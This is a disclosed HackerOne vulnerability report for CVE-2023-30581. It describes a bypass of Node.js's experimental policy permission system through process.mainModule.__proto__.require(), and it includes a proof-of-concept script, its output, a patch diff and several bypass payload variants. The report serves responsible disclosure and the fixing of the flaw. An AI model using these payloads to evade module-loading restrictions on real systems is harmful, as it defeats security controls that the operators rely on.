---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2023-07-20
submitted: 2023-02-17T17:58:20.197Z
bounty_usd: null
votes: 8
cve: "CVE-2023-30581"
program: "[[programs/nodejs|Node.js]]"
reporter: "haxatron1"
source: "https://hackerone.com/reports/1877919"
title: "The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1"
---
# The use of __proto__ in process.mainModule.__proto__.require() bypasses the permission system in Node v19.6.1

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 8 | **Program:** Node.js | **Disclosed:** 2023-07-20

- Report: [https://hackerone.com/reports/1877919](https://hackerone.com/reports/1877919)
- CWE: Privilege Escalation | CVE: CVE-2023-30581
- Submitted: 2023-02-17T17:58:20.197Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

process.mainModule.require() correctly works with permission system in Node v19.6.1. 
But the use of \_\_proto\_\_  in process.mainModule.\_\_proto\_\_.require() can bypass the check.

# Description and STR
Consider the following policy.json:
`````
{
  "resources": {
    "./proc.js": {
      "integrity": true
    }
  }
}
`````
The policy only allows proc.js file to be loaded without any dependencies.

However with the following proc.js
`````
const os = process.mainModule.__proto__.require("os")

console.log(process.version)
console.log(os.version())
`````
We get the output:
`````
└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
v19.6.1
#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
(node:2720) ExperimentalWarning: Policies are experimental.
(Use `node --trace-warnings ...` to show where the warning was created)
`````
Therefore os dependency can be loaded and os.version executed even if unspecified in permission system.

## Impact

Bypass the permission system

## Timeline

- **Report Filed**
- **2023-02-18** @haxatron1: This is a bypass of https://nodejs.org/en/blog/vulnerability/february-2023-security-releases/#node-js-permissions-policies-can-be-bypassed-via-process-mainmodule-high-cve-2023-23918
- **2023-02-18** @haxatron1: Suggested Fix:
````````
diff --git a/lib/internal/modules/cjs/loader.js b/lib/internal/modules/cjs/loader.js
index 8d602df88a..0dd779c53b 100644
--- a/lib/internal/modules/cjs/loader.js
+++ b/lib/internal/modules/cjs/loader.js
@@ -230,7 +230,7 @@ function Module(id = '', parent) {
     const moduleURL = pathToFileURL(id);
     redirects = manifest.getDependencyMapper(moduleURL);
     // TODO(rafaelgss): remove the necessity of this branch
-    setOwnProperty(this, 'require', makeRequireFunction(this, redirects));
+    this.__proto__.require = makeRequireFunction(this, redirects);
   }
   this[require_private_symbol] = internalRequire;
 }
````````
I tested it and it works
- **2023-02-19** @haxatron1: I realised the above patch breaks the object-define bypass test. I think the solution should be that if a policy manifest is detected, then Module.prototype.require should be set to null as each individual module should already have its own version of require via the setOwnProperty call https://github.com/nodejs/node/blob/main/lib/internal/modules/cjs/loader.js#L233. I have updated the suggested patch to rectify this. Now when accessing process.mainModule.\_\_proto\_\_.require when using policy manifest it is null instead of the old vulnerable require() function

The side effect is that the object-define-bypass test now throws an error of mod.require not being defined instead of exiting on process.exit(1). But I think that it is fine as it seems to be a test for an exploit rather than a test for feature 

Attached is suggest patch + unit tests.
- **2023-02-19** @mcollina: Thanks for reporting! We will take a look in the next few days, all the security team is resting after last week security release.
- **Report Triaged**
- **2023-05-29** @rafaelgss: This patch seems to solve the issue. @haxatron1 could you please validate? {F2382091}
- **2023-05-30** @haxatron1: @rafaelgss I applied the patch locally and also tried the following payloads
`````
process.mainModule.__proto__.require('os')
process.mainModule.constructor.prototype.require('os')
module.__proto__.require('os')
module.constructor.prototype.require('os')
`````
I can confirm it fixes the issue.
- **Cve Id Added**
- **2023-06-14** @rafaelgss: Hi @haxatron1! Would you like to be credited in the release notes? If yes, which name would you like us to use?

Example:

Thanks, to haxatron1 for reporting this vulnerability.
- **2023-06-14** @haxatron1: Hi, pls use 

"Thanks, to Axel Chong for reporting this vulnerability" 

Thanks!
- **Report Resolved**
- **Agreed On Going Public**
- **Report Became Public**
